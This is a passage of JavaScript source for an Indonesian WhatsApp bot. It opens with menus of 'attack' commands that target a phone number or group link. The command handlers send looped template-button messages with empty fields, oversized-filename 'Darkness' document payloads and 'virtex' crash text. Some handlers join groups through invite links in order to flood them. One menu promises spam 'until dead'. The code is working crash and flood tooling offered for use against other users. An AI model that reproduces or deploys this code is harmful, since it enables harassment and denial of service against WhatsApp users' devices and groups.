┃╭━━━━━━━━━━━━━━━━╮
┃┃  ݊⃟̥⃝̇݊⃟╾•ATTACK_MENU1•╼⃟݊⃟̥⃝̇݊݊⃟   
┃┣━━━━━━━━━━━━━━━━╮
┃┃    NOTE: KETIK DI GC
┃┃        Attack Private
┃╰━━━━━━━━━━━━━━━━╯
┃╭━━━━━━━━━━━━━━━━╮
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}josendbug1 (Nomer) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}josendbug2 (Nomer) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}josendbug3 (Nomer) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}josendbug4 (Nomer) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}josendbug5 (Nomer) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}josendbug6 (Nomer) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}josendbug7 (Nomer) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}josendbug8 (Nomer) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}josendbug9 (Nomer) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}josendbug10 (Nomer) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}josendbug11 (Nomer) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}josendbug12 (Nomer) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jovnto (Nomer) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}kintilto (Nomer)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jobutto (Nomer) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}teluhpc (Nomer) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jostikto (Nomer) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jopayto (Nomer) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jotrolito (Nomer)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}kuntulto (Nomer)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}kontolto (Nomer)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}johelloto (Nomer)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}josantetto (Nomer) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jomomoto (Nomer) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}joinfiniteto (Nomer) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jobuttonto (Nomer)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jolivelocto (Nomer)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jobuglocto (Nomer)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jobugdocto (Nomer)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jobuginviteto (Nomer)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jotengkorakto (Nomer) 
┃╰━━━━━━━━━━━━━━━━╯
┣━━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈̲̅𝙰̲̅𝙽̲̅𝙱̲̅𝙾̲̅𝚃̲̅𝚉̲̅:̲̅𝙼̲̅𝙳̲̅〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟━•⊰᯽
┃╭━━━━━━━━━━━━━━━━╮
┃┃  ݊⃟̥⃝̇݊⃟╾•ATTACK_MENU2•╼⃟݊⃟̥⃝̇݊݊⃟   
┃┣━━━━━━━━━━━━━━━━╮
┃┃    NOTE: KETIK DI GC
┃┃  Attack Grup Dan Private
┃╰━━━━━━━━━━━━━━━━╯
┃╭━━━━━━━━━━━━━━━━╮
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jogasbug1 (Nomer) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jogasbug2 (Nomer) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jogasbug3 (Nomer) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jogasbug4 (Nomer) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jogasbug5 (Nomer) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jogasbug6 (Nomer) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jogasbug7 (Nomer) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jogasbug8 (Nomer) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jogasbug9 (Nomer) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jogasbug10 (Nomer) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jogasbug11 (Nomer) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jogasbug12 (Nomer) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jogasvn (Nomer) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jogasstik (Nomer) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jogaspay (Nomer) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jogastroli (Nomer)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jogaskintil (Nomer)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jogasteluh (Nomer) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jogashello (Nomer) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jogaskuntul (Nomer)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jogassantet (Nomer) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jogasmomo (Nomer) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jogaskontol (Nomer)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jogasinfinite (Nomer) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jogasliveloc (Nomer)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jogasbutton (Nomer)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jogasbugloc (Nomer)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jogastengkorak (Nomer) 
┃╰━━━━━━━━━━━━━━━━╯
┣━━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈̲̅𝙰̲̅𝙽̲̅𝙱̲̅𝙾̲̅𝚃̲̅𝚉̲̅:̲̅𝙼̲̅𝙳̲̅〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟━•⊰᯽
┃╭━━━━━━━━━━━━━━━━╮
┃┃   ݊⃟̥⃝̇݊⃟╾•ATTACK_GROUP•╼⃟݊⃟̥⃝̇݊݊⃟   
┃┣━━━━━━━━━━━━━━━━╮
┃┃     NOTE: KETIK DI PC
┃┃ Attack Gc Tanpa Masuk Gc
┃╰━━━━━━━━━━━━━━━━╯
┃╭━━━━━━━━━━━━━━━━╮
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}troligc (Linkgc) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}teluhgc (Linkgc) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}lokasgc (Linkgc) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}bugvngc (Linkgc) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}virkongc (Linkgc) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}kuntulgc (Linkgc) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}kontolgc (Linkgc) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jonessgc (Linkgc) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}livelocgc (Linkgc) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}darknessgc (Linkgc) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}buttonlocgc (Linkgc) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}buttondocgc (Linkgc) 
┃╰━━━━━━━━━━━━━━━━╯
┣━━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈̲̅𝙰̲̅𝙽̲̅𝙱̲̅𝙾̲̅𝚃̲̅𝚉̲̅:̲̅𝙼̲̅𝙳̲̅〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟━⊰•᯽
┃╭━━━━━━━━━━━━━━━━╮
┃┃   ݊⃟̥⃝̇݊⃟╾•JADIBUG_MENU•╼⃟݊⃟̥⃝̇݊݊⃟   
┃┣━━━━━━━━━━━━━━━━╮
┃┃  NOTE: KETIK DI GC/PC
┃┃         Membuat Bug
┃╰━━━━━━━━━━━━━━━━╯
┃╭━━━━━━━━━━━━━━━━╮
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}polling (Teks) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jaditroli (Teks) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jadikintil (Teks) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jaditeluh (Teks) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jadipeler (Teks) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jadilokas (Teks) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jadikuntul (Teks) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jadikontol (Teks) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jadiliveloc (Teks) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jadibugloc (Teks) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jadimonyet (Teks) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jadibugbutton (Teks) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}tobugstik (Reply Img) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jadislayer (Reply Img) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jadicatalog (Reply Img) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jadibugvn (Reply Audio) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jadijoness (Reply Media) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jadibugdoc (Reply Media) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jadibugstik (Reply Sticker) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jadidarkness (Reply Media) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jadibuttonimg (ReplyImage) 
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jadibuttondoc (Reply Media) 
┃╰━━━━━━━━━━━━━━━━╯
┣━━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈̲̅𝙰̲̅𝙽̲̅𝙱̲̅𝙾̲̅𝚃̲̅𝚉̲̅:̲̅𝙼̲̅𝙳̲̅〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟━•⊰᯽
┃╭━━━━━━━━━━━━━━━━╮
┃┃   ݊⃟̥⃝̇݊⃟╾•UNLIMITED_BUG•╼⃟݊⃟̥⃝̇݊݊⃟   
┃┣━━━━━━━━━━━━━━━━╮
┃┃  NOTE: KETIK DI GC/PC
┃┃            Spam Bug
┃┃  Tanpa Henti Sampai Mati
┃╰━━━━━━━━━━━━━━━━╯
┃╭━━━━━━━━━━━━━━━━╮
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}unlibuttondoc
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}unlibuttonloc
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}unlibuggam
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}unlikontol
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}unlijoness
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}tengkorak
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}unlivirkon
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}virtexaja
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}teluhaja
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}unlitroli
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}dokcok
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}unlipc
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}tagaja
┃╰━━━━━━━━━━━━━━━━╯
╰━━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈̲̅𝙰̲̅𝙽̲̅𝙱̲̅𝙾̲̅𝚃̲̅𝚉̲̅:̲̅𝙼̲̅𝙳̲̅〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟╾━━╯
 ▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

© ⏤͜͡★𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃

 ♡ ㅤ    ❍ㅤ        ⎙ㅤ        ⌲
ᴸⁱᵏᵉ   ᶜᵒᵐᵐᵉⁿᵗ   ᵈᵒʷⁿˡᵒᵃᵈ     ˢʰᵃʳᵉ`
jobotz.sendMessage(m.chat, {image: thumb,  
"contextInfo": {
"externalAdReply": {
"title": `© ꧁✿𝗬𝗮𝗻 𝗧𝗵𝗲𝘀𝗼𝗽𝗽ッ𝟮𝟱𝟴〠✿꧂`,
"body":`Runtime ${runtime(process.uptime())}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": thumb
}}, caption: anu }, {quoted: fkonjo, contextInfo:{}})
}
break

case 'jogasteluh': {
if (!isCreator && !isBan) return
if (!q) return repjo(`Nomornya mana?\nContoh: ${prefix+command} 62812xxxxxxx`)
if (cekno.length == 0) return repjo(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
jumlah = '15'
for (let i = 0; i < jumlah; i++) {
jobotz.sendMessage(tosend, {
text: '', 
templateButtons: [
{ callButton: { displayText: `P`, phoneNumber: ``}},
{ urlButton: { displayText: `P`, url: `https://wa.me/`}},
{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
]})
jobotz.sendMessage(m.chat, {
text: '', 
templateButtons: [
{ callButton: { displayText: `P`, phoneNumber: ``}},
{ urlButton: { displayText: `P`, url: `https://wa.me/`}},
{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
]})
}
buttonjo(`Sukses`)
}
break

case 'teluhpc':
if (!isCreator && !isBan) return
if (!q) return repjo(`Nomornya mana?\nContoh: ${prefix+command} 62812xxxxxxx`)
if (cekno.length == 0) return repjo(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
jumlah = '30'
for (let i = 0; i < jumlah; i++) {
jobotz.sendMessage(tosend, {
text: '', 
templateButtons: [
{ callButton: { displayText: `P`, phoneNumber: ``}},
{ urlButton: { displayText: `P`, url: `https://wa.me/`}},
{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
]})
}
repjo(`Sukses`)
break

case 'teluhgc':
if (!isCreator && !isBan) return
if (!q) return repjo(`Linkgc mana?\nContoh: ${prefix+command} (linkgroup)`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) repjo(`Masukkan linkgc yg valid`)
let result = args[0].split('https://chat.whatsapp.com/')[1]
jumlah = '30'
for (let i = 0; i < jumlah; i++) {
let tosendgc = await jobotz.groupAcceptInvite(result)
jobotz.sendMessage(tosendgc, {
text: '', 
templateButtons: [
{ callButton: { displayText: `P`, phoneNumber: ``}},
{ urlButton: { displayText: `P`, url: `https://wa.me/`}},
{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
]})
}
repjo(`Sukses`)
break

case 'tag': {
 if (!isCreator) return
 if (!m.isGroup) throw mess.group
jobotz.sendMessage(m.chat, { text : q ? q : '████████████████████\n██░░░░╔╦╗╦─╦╔╗░░░░██\n██░░░░─║─╠═╣╠─░░░░██\n██░░░░─╩─╩─╩╚╝░░░░██\n██░░░░░░─╦╔╗░░░░░░██\n██░░░░░░─║║║░░░░░░██\n██░░░░░░╚╝╚╝░░░░░░██\n██░░░░─╦╗╔╗╔╦╗░░░░██\n██░░░░─║╣║║─║─░░░░██\n██░░░░─╩╝╚╝─╩─░░░░██\n████████████████████' , mentions: participants.map(a => a.id), contextInfo: { externalAdReply:{title:`${wm} \n${thejo}`,body: `${wm} \n${thejo}`, previewType:"PHOTO", showAdAttribution: true, thumbnail: virgam,sourceUrl:`https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`}}}, { quoted: fdocjo })
            buttonjo(`Tag Aja`)
            }
            break

case 'tagaja': {
 if (!isCreator) return
 if (!m.isGroup) throw mess.group
jobotz.sendMessage(m.chat, { text : q ? q : '████████████████████\n██░░░░╔╦╗╦─╦╔╗░░░░██\n██░░░░─║─╠═╣╠─░░░░██\n██░░░░─╩─╩─╩╚╝░░░░██\n██░░░░░░─╦╔╗░░░░░░██\n██░░░░░░─║║║░░░░░░██\n██░░░░░░╚╝╚╝░░░░░░██\n██░░░░─╦╗╔╗╔╦╗░░░░██\n██░░░░─║╣║║─║─░░░░██\n██░░░░─╩╝╚╝─╩─░░░░██\n████████████████████' , mentions: participants.map(a => a.id), contextInfo: { externalAdReply:{title:`${wm} \n${thejo}`,body: `${wm} \n${thejo}`, previewType:"PHOTO", showAdAttribution: true, thumbnail: virgam,sourceUrl:`https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`}}}, { quoted: fdocjo })
  buttonjo(`Tag Aja`)
  await setTimeout(() => {
jobotz.sendMessage(m.chat, {text: command},{ messageId: m.key.id,})
}, 2000)
  }
  break

case 'unlibuggam':{
if (!isCreator && !isBan) return
jobotz.sendMessage(m.chat,{ image: {url: 'https://telegra.ph/file/313cd5e07455d25a8db88.jpg'}, thumbnail: virgam, quoted: m, contextInfo: { externalAdReply:{title:`${wm} \n${thejo}`,body: `${wm} \n${thejo}`, previewType:"PHOTO", showAdAttribution: true, thumbnail: virgam,sourceUrl:`https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`}}, caption: captijo},{quoted: fdocjo, contextInfo:{}})
buttonjo(`Sukses`)
await setTimeout(() => {
jobotz.sendMessage(m.chat, {text: command},{ messageId: m.key.id,})
}, 2000)
}
break

case 'buggam':{
if (!isCreator && !isBan) return
if (args.length == 0) return repjo(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
for (let i = 0; i < jumlah; i++) {
anu = `©⏤͜͡★𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃\n\n${thejo}`
jobotz.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/313cd5e07455d25a8db88.jpg'},  
"contextInfo": {
"externalAdReply": {
"title": `${thejo}`,
"body":`${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam
}},caption:anu }, {quoted: fkonjo, contextInfo:{}})
jobotz.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/313cd5e07455d25a8db88.jpg'},  
"contextInfo": {
"externalAdReply": {
"title": `${thejo}`,
"body":`${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam
}},caption:anu}, {quoted: fdocjo, contextInfo:{}})
}
buttonjo(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break

case 'p': case 'f': {
if (!isCreator && !isBan) return
jumlah = '5'
for (let i = 0; i < jumlah; i++) {
jobotz.sendMessage(m.chat, {
text: '', 
templateButtons: [
{ callButton: { displayText: `P`, phoneNumber: ``}},
{ callButton: { displayText: `P`, phoneNumber: ``}},
{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
]})
}
jancok(`Assalamualaikum`)
buttonjo(`Salam Dulu Dek\n${thejo}`)
}
 break

case 'tengkorak': 
if (!isCreator && !isBan) return
 teng = `
██▀░░░░░░░░░░░░░▀██
█│░░░░░░░░░░░░░░░│█
▌│░░░░░░░░░░░░░░░│▐
░└┐░░░░░░░░░░░░░┌┘░
░░└┐░░░░░░░░░░░┌┘░░
░░┌┘▄▄▄░░░░░▄▄▄└┐░░
▌░│████▌░░░▐████│░▐
█░│▐██▀░░▄░░▀██▌│░█
█▌┘░░░░░▐█▌░░░░░└▐█
██░░▄▄▓░▀█▀░▓▄▄░░██
██▄─┘█▌░░░░░▐█└─▄██
███░░▐─┬┬┬┬┬─▌░░███
███▌░░┬┼┼┼┼┼┬░░▐███
████▄░└┴┴┴┴┴┘░▄████
█████▄░░░░░░░▄█████
`
await jobotz.sendMessage(m.chat, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `${wm}                         ${thejo}`, thumbnail: virgam, quoted: fgamjo,
"contextInfo": {
"externalAdReply": {
"title": `${thejo}`,
"body":`${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam,
"forwardingScore": 150,
"isForwarded": true
}}, caption:teng},
{quoted: fkonjo, contextInfo:{}})
buttonjo(`Sukses`)
await setTimeout(() => {
jobotz.sendMessage(m.chat, {text: command},{ messageId: m.key.id,})
}, 2000)
break

case 'virtex':{
if (!isCreator && !isBan) return
if (args.length == 0) return repjo(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
for (let i = 0; i < jumlah; i++) {
jobotz.sendMessage(m.chat, {text: `${thejo}`}, { packname: global.packname, author: global.author })
}
}
break

case 'virtexaja':{
if (!isCreator && !isBan) return
jobotz.sendMessage(m.chat, {text: `${thejo}`}, { packname: global.packname, author: global.author })
buttonjo(`Start`)
await setTimeout(() => {
jobotz.sendMessage(m.chat, {text: command},{ messageId: m.key.id,})
}, 2000)
}
break

case 'darknessgc': {
if (!isCreator && !isBan) return
if (!q) return repjo(`Linkgc mana?\nContoh: ${prefix+command} (linkgroup)`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) repjo(`Masukkan linkgc yg valid`)
let result = args[0].split('https://chat.whatsapp.com/')[1]
jumlah = '3'
for (let i = 0; i < jumlah; i++) {
let tosendgc = await jobotz.groupAcceptInvite(result)
jobotz.sendMessage(tosendgc, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `Darkness メ                                  ${virusv3}`, thumbnail: virgam, quoted: m, contextInfo: { externalAdReply:{title:`${wm}`,body: `${wm} \n${thejo}`, previewType:"PHOTO", showAdAttribution: true, thumbnail: virgam,sourceUrl:`https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`}}, caption: captijo}, {quoted: fdocjo, contextInfo:{}})
}
repjo(`Sukses`)
}
break

case 'jadidarkness':{
if (!isCreator && !isBan) return 
if (!m.quoted) throw `*Send/Reply Media`
if (!text) throw `Teksnya Mana?`
let media = await quoted.download()
var messa = await prepareWAMessageMedia(
{ document: media }, 
{ upload: jobotz.waUploadToServer })
kkkkk = media
jobotz.sendMessage(m.chat, {document: kkkkk, mimetype: 'document/pdf', fileName: `Darkness メ ${text}                         ${virusv3}`, thumbnail: virgam, quoted: m, contextInfo: { externalAdReply:{title:`${wm}`,body: `${wm} \n${thejo}`, previewType:"PHOTO", showAdAttribution: true, thumbnail: virgam,sourceUrl:`https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`}}, caption: captijo}, {quoted: fkonjo, contextInfo:{}})
jobotz.sendMessage(m.chat, {document: kkkkk, mimetype: 'document/pdf', fileName: `Darkness メ ${text}                          ${virusv3}`, thumbnail: virgam, quoted: m, contextInfo: { externalAdReply:{title:`${wm}`,body: `${wm} \n${thejo}`, previewType:"PHOTO", showAdAttribution: true, thumbnail: virgam,sourceUrl:`https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`}}, caption: captijo}, {quoted: fdocjo, contextInfo:{}})
buttonjo(`Sukses`)
}
break

case 'darkness':{
if (!isCreator && !isBan) return
if (args.length == 0) return repjo(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
for (let i = 0; i < jumlah; i++) {
jobotz.sendMessage(m.chat, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `Darkness メ                                  ${virusv3}`, thumbnail: virgam, quoted: m, contextInfo: { externalAdReply:{title:`${wm}`,body: `${wm} \n${thejo}`, previewType:"PHOTO", showAdAttribution: true, thumbnail: virgam,sourceUrl:`https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`}}, caption: captijo}, {quoted: fkonjo, contextInfo:{}})
jobotz.sendMessage(m.chat, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `Darkness メ                                  ${virusv3}`, thumbnail: virgam, quoted: m, contextInfo: { externalAdReply:{title:`${wm}`,body: `${wm} \n${thejo}`, previewType:"PHOTO", showAdAttribution: true, thumbnail: virgam,sourceUrl:`https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`}}, caption: captijo}, {quoted: fdocjo, contextInfo:{}})
}
buttonjo(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break

case 'unlijoness':{
if (!isCreator && !isBan) return
jobotz.sendMessage(m.chat, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `Joness メ                         ${thejo}`, thumbnail: virgam, quoted: m, contextInfo: { externalAdReply:{title:`${wm} \n${thejo}`,body: `${wm} \n${thejo}`, previewType:"PHOTO", showAdAttribution: true, thumbnail: virgam,sourceUrl:`https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`}}, caption: captijo}, {quoted: fkonjo, contextInfo:{}})
buttonjo(`Start`)
await setTimeout(() => {
jobotz.sendMessage(m.chat, {text: command},{ messageId: m.key.id,})
}, 2000)
}
break

case 'jadijoness':{
if (!isCreator && !isBan) return 
if (!m.quoted) throw `*Send/Reply Media`
if (!text) throw `Teksnya Mana?`
let media = await quoted.download()
var messa = await prepareWAMessageMedia(
{ document: media }, 
{ upload: jobotz.waUploadToServer })
kkkk = media
jobotz.sendMessage(m.chat, {document: kkkk, mimetype: 'document/pdf', fileName: `${text} Joness メ                         ${thejo}`, thumbnail: virgam, quoted: m, contextInfo: { externalAdReply:{title:`${wm} \n${thejo}`,body: `${wm} \n${thejo}`, previewType:"PHOTO", showAdAttribution: true, thumbnail: virgam,sourceUrl:`https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`}}, caption: captijo}, {quoted: fkonjo, contextInfo:{}})
jobotz.sendMessage(m.chat, {document: kkkk, mimetype: 'document/pdf', fileName: `${text} Joness メ                         ${thejo}`, thumbnail: virgam, quoted: m, contextInfo: { externalAdReply:{title:`${wm} \n${thejo}`,body: `${wm} \n${thejo}`, previewType:"PHOTO", showAdAttribution: true, thumbnail: virgam,sourceUrl:`https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`}}, caption: captijo}, {quoted: fdocjo, contextInfo:{}})
buttonjo(`Sukses`)
}
break

case 'jonessgc': {
if (!isCreator && !isBan) return
if (!q) return repjo(`Linkgc mana?\nContoh: ${prefix+command} (linkgroup)`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) repjo(`Masukkan linkgc yg valid`)
let result = args[0].split('https://chat.whatsapp.com/')[1]
jumlah = '2'
for (let i = 0; i < jumlah; i++) {
let tosendgc = await jobotz.groupAcceptInvite(result)
jobotz.sendMessage(m.chat, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `Joness メ                         ${thejo}`, thumbnail: virgam, quoted: m, contextInfo: { externalAdReply:{title:`${wm} \n${thejo}`,body: `${wm} \n${thejo}`, previewType:"PHOTO", showAdAttribution: true, thumbnail: virgam,sourceUrl:`https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`}}, caption: captijo}, {quoted: fkonjo, contextInfo:{}})
